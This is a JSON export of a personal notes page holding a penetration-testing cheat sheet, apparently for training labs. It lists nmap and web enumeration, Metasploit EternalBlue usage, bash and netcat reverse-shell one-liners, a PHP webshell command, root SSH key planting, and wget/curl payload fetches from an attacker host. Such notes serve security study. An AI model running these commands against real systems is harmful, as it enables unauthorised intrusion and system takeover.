{"pageProps":{"note":{"id":"3o48nuz7byeshb4lhbfpang","title":"PEN_cheatsheet","desc":"","updated":1680495661398,"created":1673077678854,"custom":{},"fname":"Cheat Sheets.PEN_cheatsheet","type":"note","vault":{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"},"contentHash":"ab2eddf0dad115e1d9e3b083f494ee29","links":[{"type":"wiki","from":{"fname":"Cheat Sheets.PEN_cheatsheet","id":"3o48nuz7byeshb4lhbfpang","vaultName":"Cybersecurity_Notes"},"value":"Cheat Sheets.PEN_cheatsheet.Nmap","position":{"start":{"line":38,"column":30,"offset":1233},"end":{"line":38,"column":66,"offset":1269},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"Cheat Sheets.PEN_cheatsheet.Nmap"}},{"type":"wiki","from":{"fname":"Cheat Sheets.PEN_cheatsheet","id":"3o48nuz7byeshb4lhbfpang","vaultName":"Cybersecurity_Notes"},"value":"Cheat Sheets.PEN_cheatsheet.Nmap","position":{"start":{"line":39,"column":45,"offset":1325},"end":{"line":39,"column":81,"offset":1361},"indent":[]},"xvault":false,"sameFile":false,"to":{"fname":"Cheat Sheets.PEN_cheatsheet.Nmap"}},{"from":{"fname":"Cheat Sheets","id":"t7zelcb6b17opo2gjy4y9cq","vaultName":"Cybersecurity_Notes"},"type":"backlink","position":{"start":{"line":1,"column":1,"offset":0},"end":{"line":1,"column":47,"offset":46},"indent":[]},"value":"Cheat Sheets.PEN_cheatsheet"}],"anchors":{"basic-tools":{"type":"header","text":"Basic Tools","value":"basic-tools","line":7,"column":0,"depth":2},"pentesting":{"type":"header","text":"Pentesting","value":"pentesting","line":40,"column":0,"depth":2}},"children":["hkaksah1ldknzu7xvqrkkkt","4it4kktpaqbu2raq4bk5oub","kv3ad81dyojtgr1w4nfq9ig"],"parent":"t7zelcb6b17opo2gjy4y9cq","data":{}},"body":"<h1 id=\"pen_cheatsheet\">PEN_cheatsheet<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#pen_cheatsheet\"></a></h1>\n<h2 id=\"basic-tools\">Basic Tools<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#basic-tools\"></a></h2>\n<div class=\"table-responsive\">\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>General</strong></td><td></td></tr><tr><td><code>sudo openvpn user.ovpn</code></td><td>Connect to VPN</td></tr><tr><td><code>ifconfig</code>/<code>ip a</code></td><td>Show our IP address</td></tr><tr><td><code>netstat -rn</code></td><td>Show networks accessible via the VPN</td></tr><tr><td><code>ssh user@10.10.10.10</code></td><td>SSH to a remote server</td></tr><tr><td><code>ftp 10.129.42.253</code></td><td>FTP to a remote server</td></tr><tr><td><strong>tmux</strong></td><td></td></tr><tr><td><code>tmux</code></td><td>Start tmux</td></tr><tr><td><code>ctrl+b</code></td><td>tmux: default prefix</td></tr><tr><td><code>prefix c</code></td><td>tmux: new window</td></tr><tr><td><code>prefix 1</code></td><td>tmux: switch to window (<code>1</code>)</td></tr><tr><td><code>prefix shift+%</code></td><td>tmux: split pane vertically</td></tr><tr><td><code>prefix shift+\"</code></td><td>tmux: split pane horizontally</td></tr><tr><td><code>prefix -></code></td><td>tmux: switch to the right pane</td></tr><tr><td><strong>Vim</strong></td><td></td></tr><tr><td><code>vim file</code></td><td>vim: open <code>file</code> with vim</td></tr><tr><td><code>esc+i</code></td><td>vim: enter <code>insert</code> mode</td></tr><tr><td><code>x</code></td><td>vim: Cut character</td></tr><tr><td><code>dw</code></td><td>vim: Cut word</td></tr><tr><td><code>dd</code></td><td>vim: Cut full line</td></tr><tr><td><code>yw</code></td><td>vim: Copy word</td></tr><tr><td><code>yy</code></td><td>vim: Copy full line</td></tr><tr><td><code>p</code></td><td>vim: Paste</td></tr><tr><td><code>:1</code></td><td>vim: Go to line number 1.</td></tr><tr><td><code>:w</code></td><td>vim: Write the file 'i.e. save'</td></tr><tr><td><code>:q</code></td><td>vim: Quit</td></tr><tr><td><code>:q!</code></td><td>vim: Quit without saving</td></tr><tr><td><code>:wq</code></td><td>vim: Write and quit</td></tr></tbody></table></div>\n<h2 id=\"pentesting\">Pentesting<a aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#pentesting\"></a></h2>\n<div class=\"table-responsive\">\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>Service Scanning</strong></td><td></td></tr><tr><td><code>nmap 10.129.42.253</code></td><td>Run <a href=\"/Notes/notes/4it4kktpaqbu2raq4bk5oub\">Nmap</a> on an IP</td></tr><tr><td><code>nmap -sV -sC -p- 10.129.42.253</code></td><td>Run an <a href=\"/Notes/notes/4it4kktpaqbu2raq4bk5oub\">Nmap</a> script scan on an IP</td></tr><tr><td><code>locate scripts/citrix</code></td><td>List various available nmap scripts</td></tr><tr><td><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></td><td>Run an nmap script on an IP</td></tr><tr><td><code>xsltproc target.xml -o target.html</code></td><td>Convert stored results from XML to HTML</td></tr><tr><td><code>netcat 10.10.10.10 22</code></td><td>Grab banner of an open port</td></tr><tr><td><code>smbclient -N -L \\\\\\\\10.129.42.253</code></td><td>List SMB Shares</td></tr><tr><td><code>smbclient \\\\\\\\10.129.42.253\\\\users</code></td><td>Connect to an SMB share</td></tr><tr><td><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code></td><td>Scan SNMP on an IP</td></tr><tr><td><code>onesixtyone -c dict.txt 10.129.42.254</code></td><td>Brute force SNMP secret string</td></tr><tr><td><strong>Web Enumeration</strong></td><td></td></tr><tr><td><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code></td><td>Run a directory scan on a website</td></tr><tr><td><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code></td><td>Run a sub-domain scan on a website</td></tr><tr><td><code>curl -IL https://www.inlanefreight.com</code></td><td>Grab website banner</td></tr><tr><td><code>whatweb 10.10.10.121</code></td><td>List details about the webserver/certificates</td></tr><tr><td><code>curl 10.10.10.121/robots.txt</code></td><td>List potential directories in <code>robots.txt</code></td></tr><tr><td><code>ctrl+U</code></td><td>View page source (in Firefox)</td></tr><tr><td><strong>Public Exploits</strong></td><td></td></tr><tr><td><code>searchsploit openssh 7.2</code></td><td>Search for public exploits for a web application</td></tr><tr><td><code>msfconsole</code></td><td>MSF: Start the Metasploit Framework</td></tr><tr><td><code>search exploit eternalblue</code></td><td>MSF: Search for public exploits in MSF</td></tr><tr><td><code>use exploit/windows/smb/ms17_010_psexec</code></td><td>MSF: Start using an MSF module</td></tr><tr><td><code>show options</code></td><td>MSF: Show required options for an MSF module</td></tr><tr><td><code>set RHOSTS 10.10.10.40</code></td><td>MSF: Set a value for an MSF module option</td></tr><tr><td><code>check</code></td><td>MSF: Test if the target server is vulnerable</td></tr><tr><td><code>exploit</code></td><td>MSF: Run the exploit on the target server is vulnerable</td></tr><tr><td><strong>Using Shells</strong></td><td></td></tr><tr><td><code>nc -lvnp 1234</code></td><td>Start a <code>nc</code> listener on a local port</td></tr><tr><td><code>bash -c 'bash -i >&#x26; /dev/tcp/10.10.10.10/1234 0>&#x26;1'</code></td><td>Send a reverse shell from the remote server</td></tr><tr><td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2>&#x26;1\\|nc 10.10.10.10 1234 >/tmp/f</code></td><td>Another command to send a reverse shell from the remote server</td></tr><tr><td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2>&#x26;1\\|nc -lvp 1234 >/tmp/f</code></td><td>Start a bind shell on the remote server</td></tr><tr><td><code>nc 10.10.10.1 1234</code></td><td>Connect to a bind shell started on the remote server</td></tr><tr><td><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code></td><td>Upgrade shell TTY (1)</td></tr><tr><td><code>ctrl+z</code> then <code>stty raw -echo</code> then <code>fg</code> then <code>enter</code> twice</td><td>Upgrade shell TTY (2)</td></tr><tr><td><code>echo \"&#x3C;?php system(\\$_GET['cmd']);?>\" > /var/www/html/shell.php</code></td><td>Create a webshell php file</td></tr><tr><td><code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code></td><td>Execute a command on an uploaded webshell</td></tr><tr><td><strong>Privilege Escalation</strong></td><td></td></tr><tr><td><code>./linpeas.sh</code></td><td>Run <a href=\"https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS\">linpeas</a> script to enumerate remote server</td></tr><tr><td><code>sudo -l</code></td><td>List available <code>sudo</code> privileges</td></tr><tr><td><code>sudo -u user /bin/echo Hello World!</code></td><td>Run a command with <code>sudo</code></td></tr><tr><td><code>sudo su -</code></td><td>Switch to root user (if we have access to <code>sudo su</code>)</td></tr><tr><td><code>sudo su user -</code></td><td>Switch to a user (if we have access to <code>sudo su</code>)</td></tr><tr><td><code>ssh-keygen -f key</code></td><td>Create a new SSH key</td></tr><tr><td><code>echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" >> /root/.ssh/authorized_keys</code></td><td>Add the generated public key to the user</td></tr><tr><td><code>ssh root@10.10.10.10 -i key</code></td><td>SSH to the server with the generated private key</td></tr><tr><td><strong>Transferring Files</strong></td><td></td></tr><tr><td><code>python3 -m http.server 8000</code></td><td>Start a local webserver</td></tr><tr><td><code>wget http://10.10.14.1:8000/linpeas.sh</code></td><td>Download a file on the remote server from our local machine</td></tr><tr><td><code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code></td><td>Download a file on the remote server from our local machine</td></tr><tr><td><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code></td><td>Transfer a file to the remote server with <code>scp</code> (requires SSH access)</td></tr><tr><td><code>base64 shell -w 0</code></td><td>Convert a file to <code>base64</code></td></tr><tr><td><code>echo f0VMR...SNIO...InmDwU \\| base64 -d > shell</code></td><td>Convert a file from <code>base64</code> back to its orig</td></tr><tr><td><code>md5sum shell</code></td><td>Check the file's <code>md5sum</code> to ensure it converted correctly</td></tr><tr><td><strong>Local port forwarding</strong></td><td></td></tr></tbody></table></div>\n<p>|<code>ssh -L 5432:&#x3C;localhost>:5432 user@&#x3C;remotehostIP></code></p>\n<hr>\n<strong>Backlinks</strong>\n<ul>\n<li><a href=\"/Notes/notes/t7zelcb6b17opo2gjy4y9cq\">Cheat Sheets:</a></li>\n</ul>","noteIndex":{"id":"dkhaxs77zw01c445jl4oetr","title":"My Dendron Notes","desc":"","updated":1703545954419,"created":1673083387776,"custom":{"nav_order":0,"permalink":"/"},"fname":"root","type":"note","vault":{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"},"contentHash":"7f471efbabd9262e18133bac0489cf83","links":[],"anchors":{"welcome-to-my-dendron-notes":{"type":"header","text":"Welcome to my Dendron Notes:","value":"welcome-to-my-dendron-notes","line":7,"column":0,"depth":1},"lookup":{"type":"header","text":"Lookup","value":"lookup","line":11,"column":0,"depth":2}},"children":["irggoj29glx2y8z3yum2w64","t7zelcb6b17opo2gjy4y9cq","h42642wolzf824la84a6bb7","m7j2ktba2hjk9l6avnxa7bw"],"parent":null,"data":{},"body":"# Welcome to my Dendron Notes:\n\nI am a Cyber Security Analyst/Network Administrator. A highly motivated and energetic individual, ready to start work as soon as possible. Ready to learn new skills, take on challenges and complete any education/licensing examinations necessary for career growth. Proactive critical thinker and quick learner with extremely strong work ethic. An effective problem solver who brings both technical aptitude and an understanding of business processes. Able to leverage background in finance and technical skills to evaluate complex problems faced by business. Motivated by innovation and seeking to join an organisation that will provide opportunities for professional development in a dynamic and technical team environment. Passionate about cyber security and focused on governance, risk and compliance. Member of AISA (Australian Information Security Association).\n\n## Lookup\n\nThis section contains useful links to related resources.\n\n- [Getting Started Guide](https://link.dendron.so/6b25)\n- [Discord](https://link.dendron.so/6b23)\n- [Home Page](https://wiki.dendron.so/)\n- [Github](https://link.dendron.so/6b24)\n- [Developer Docs](https://docs.dendron.so/)"},"collectionChildren":null,"customHeadContent":null,"config":{"version":5,"dev":{"enablePreviewV2":true,"enableSelfContainedVaults":true},"commands":{"lookup":{"note":{"selectionMode":"extract","confirmVaultOnCreate":true,"vaultSelectionModeOnCreate":"smart","leaveTrace":false,"bubbleUpCreateNew":true,"fuzzThreshold":0.2}},"randomNote":{},"insertNoteLink":{"aliasMode":"none","enableMultiSelect":false},"insertNoteIndex":{"enableMarker":false},"copyNoteLink":{"aliasMode":"title"},"templateHierarchy":"template"},"workspace":{"vaults":[{"fsPath":".","selfContained":true,"name":"Cybersecurity_Notes"}],"journal":{"dailyDomain":"daily","name":"journal","dateFormat":"y.MM.dd","addBehavior":"childOfDomain"},"scratch":{"name":"scratch","dateFormat":"y.MM.dd.HHmmss","addBehavior":"asOwnDomain"},"task":{"name":"task","dateFormat":"y.MM.dd","addBehavior":"asOwnDomain","statusSymbols":{"":" ","wip":"w","done":"x","assigned":"a","moved":"m","blocked":"b","delegated":"l","dropped":"d","pending":"y"},"taskCompleteStatus":["done","x"],"prioritySymbols":{"H":"high","M":"medium","L":"low"},"todoIntegration":false,"createTaskSelectionType":"selection2link"},"graph":{"zoomSpeed":1,"createStub":false},"enableAutoCreateOnDefinition":false,"enableXVaultWikiLink":false,"enableRemoteVaultInit":true,"enableUserTags":true,"enableHashTags":true,"workspaceVaultSyncMode":"noCommit","enableAutoFoldFrontmatter":false,"enableEditorDecorations":true,"maxPreviewsCached":10,"maxNoteLength":204800,"enableFullHierarchyNoteTitle":false},"preview":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enablePrettyRefs":true,"enableKatex":true,"automaticallyShowPreview":false},"publishing":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enablePrettyRefs":true,"enableKatex":true,"copyAssets":true,"siteHierarchies":["root"],"writeStubs":false,"siteRootDir":"docs","seo":{"title":"My Dendron Notes","description":"Personal Knowledge Space"},"github":{"enableEditLink":true,"editLinkText":"Edit this page on GitHub","editBranch":"main","editViewMode":"tree"},"enableSiteLastModified":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableRandomlyColoredTags":true,"enableTaskNotes":true,"enablePrettyLinks":true,"searchMode":"search","assetsPrefix":"/Notes","siteUrl":"https://greguus.github.io/","enableHierarchyDisplay":false,"siteFaviconPath":"favicon.ico","siteIndex":"root"}}},"__N_SSG":true}